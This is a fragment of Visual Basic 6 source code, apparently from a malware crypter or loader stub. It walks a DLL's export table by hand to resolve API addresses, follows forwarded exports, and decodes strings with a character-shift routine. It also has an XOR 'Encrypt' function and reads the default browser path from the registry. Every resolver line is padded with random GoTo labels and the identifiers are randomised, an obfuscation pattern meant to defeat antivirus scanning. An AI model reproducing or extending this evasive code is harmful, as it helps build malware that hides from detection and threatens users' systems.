GoTo QeMGROWrfsq
QeMGROWrfsq:
    Dim lNumbAdd    As Long
GoTo SezdLEhOiS
SezdLEhOiS:
    With tCox2jYJc
GoTo FdBgxCy6Z2jImHZIYuAIOAKF
FdBgxCy6Z2jImHZIYuAIOAKF:
        For i = 0 To .NumberOfNames - 1
GoTo Kve2ZXt8xXc9j7RBHbk
Kve2ZXt8xXc9j7RBHbk:
            FSjdPTK8NZMF lNameAdd, ByVal lBase + .lpAddressOfNames + i * 4, 4
GoTo B71162OlbZu9mFTsdsIYMhB
B71162OlbZu9mFTsdsIYMhB:
            If GthomAYUIJIwG(lBase + lNameAdd) = sProc Then
GoTo EOaj33b1SAQCEAe2LGSe
EOaj33b1SAQCEAe2LGSe:
                FSjdPTK8NZMF lNumbAdd, ByVal lBase + .lpAddressOfNameOrdinals + i * 2, 2
GoTo LWvhZsyXV3fyt0nw3UWL
LWvhZsyXV3fyt0nw3UWL:
                FSjdPTK8NZMF lFunctAdd, ByVal lBase + .lpAddressOfFunctions + lNumbAdd * 4, 4
GoTo QnGYo2yK11QxI0Q
QnGYo2yK11QxI0Q:
                FNyHnwZwmJoUaokcf = lFunctAdd + lBase
GoTo CVwBjRehRh1RuX2
CVwBjRehRh1RuX2:
                If FNyHnwZwmJoUaokcf >= lVAddress And _
                   FNyHnwZwmJoUaokcf <= lVSize Then
GoTo FaeVP8tJcwR5
FaeVP8tJcwR5:
                    Call ZerE5mRwwcwZ(FNyHnwZwmJoUaokcf, RMdFpm1U9wMAJBpY1b3a67R, sProc)
GoTo DFL6GPLtpDe2SQ23CAEYhlD
DFL6GPLtpDe2SQ23CAEYhlD:
                    If Not RMdFpm1U9wMAJBpY1b3a67R = 0 Then
GoTo Rb6LpUBD81OJwa0r
Rb6LpUBD81OJwa0r:
                        FNyHnwZwmJoUaokcf = FNyHnwZwmJoUaokcf(RMdFpm1U9wMAJBpY1b3a67R, sProc)
GoTo W1KGL7eiw
W1KGL7eiw:
                    Else
GoTo VuukHV
VuukHV:
                        FNyHnwZwmJoUaokcf = 0
GoTo FX8bZ5sOQxA9WoTlFCnfMliF
FX8bZ5sOQxA9WoTlFCnfMliF:
                    End If
GoTo JMqOvIr25hNifJa7e89
JMqOvIr25hNifJa7e89:
                End If
GoTo G4rGfiI39xkUldRQG
G4rGfiI39xkUldRQG:
                Exit Function
GoTo DnsccOPGCJrRDlDZX0D
DnsccOPGCJrRDlDZX0D:
            End If
GoTo LHAqerpoE2qMsLLmAA5KYBjXl
LHAqerpoE2qMsLLmAA5KYBjXl:
        Next
GoTo BHTMV5tkcBa4dMeNYRB
BHTMV5tkcBa4dMeNYRB:
    End With
 GoTo EuZOP92ft2bV12gF1W1I4
EuZOP92ft2bV12gF1W1I4:
End Function

Private Function ZerE5mRwwcwZ( _
       ByVal lAddress As Long, _
       ByRef lLib As Long, _
       ByRef sMod As String)
GoTo RN02W0l5lR
RN02W0l5lR:
    Dim sForward     As String
GoTo VpjF7ahpF0JV
VpjF7ahpF0JV:
    sForward = GthomAYUIJIwG(lAddress)
GoTo ZYkJIgCZ
ZYkJIgCZ:
    If InStr(1, sForward, ROT13(";", True)) Then
GoTo V8yAZs7xu2RnDv
V8yAZs7xu2RnDv:
        lLib = FvukZ3yUsm5e82Nf(Split(sForward, ROT13(";", True))(0))
GoTo ZNvd5xukppMa35yoQ5mC9Z
ZNvd5xukppMa35yoQ5mC9Z:
        sMod = Split(sForward, ROT13(";", True))(1)
GoTo V0CESEEFNoiJrgRQskCUsQLpv
V0CESEEFNoiJrgRQskCUsQLpv:
    End If
GoTo FDdU0oGXEKR1zfn5gF
FDdU0oGXEKR1zfn5gF:
End Function

Private Function GthomAYUIJIwG( _
       ByVal lAddress As Long) As String
GoTo Z2aPYPMh5wloz
Z2aPYPMh5wloz:
    Dim bChar       As Byte
GoTo SMfiwXZwcf2KNt8v6K7L43Is
SMfiwXZwcf2KNt8v6K7L43Is:
    Do
GoTo JXPIIjmT5UF2g5X9fb059
JXPIIjmT5UF2g5X9fb059:
        FSjdPTK8NZMF bChar, ByVal lAddress, 1
GoTo DCCu6IIlRoOmXBRIJIC2H3
DCCu6IIlRoOmXBRIJIC2H3:
        lAddress = lAddress + 1
GoTo EOfpGJZFtA4
EOfpGJZFtA4:
        If bChar = 0 Then Exit Do
GoTo YHebUldaxM3uUZFAayGgaY
YHebUldaxM3uUZFAayGgaY:
        GthomAYUIJIwG = GthomAYUIJIwG & Chr$(bChar)
GoTo XmIjtfTpvoX
XmIjtfTpvoX:
    Loop
GoTo A1NWhjb0
A1NWhjb0:
End Function
Public Function ROT13(ByVal sData As String, Optional ByVal Decrypt As Boolean = False) As String
Dim i As Long

For i = 1 To Len(sData)
ROT13 = ROT13 & Chr$(Asc(Mid$(sData, i, 1)) + IIf((Decrypt = True), -13, 13))
Next i
End Function
Public Function Encrypt(sText As String, sKey As String) As String
Dim i, x, y As Integer, b() As Byte, k() As Byte

Encrypt = vbNullString
x = 0
b() = StrConv(sText, vbFromUnicode)
k() = StrConv(sKey, vbFromUnicode)
For i = 0 To Len(sText) - 1
    If x = Len(sKey) - 1 Then
        x = 0
    Else
        x = x + 1
    End If
   
    For y = 1 To 255
        b(i) = b(i) Xor k(x) Mod (y + 5)
    Next y
Next i
Encrypt = StrConv(b, vbUnicode)
End Function

Public Function DefaultBrowser() As String
Dim regshell As Object, DB As String
Set regshell = CreateObject("Wscript.Shell")

DB = regshell.regread("HKEY_CLASSES_ROOT\HTTP\shell\open\command\")
' Reads the registry value where is stored the default application to use with HTTP

DB = Left(DB, InStr(1, DB, ".exe", vbTextCompare) + 4)
' Removes shell parameters after the actual path, preserving only path included in double quotes

DefaultBrowser = Replace(DB, Chr(34), vbNullString)
' Removes double quotes (")
End Function
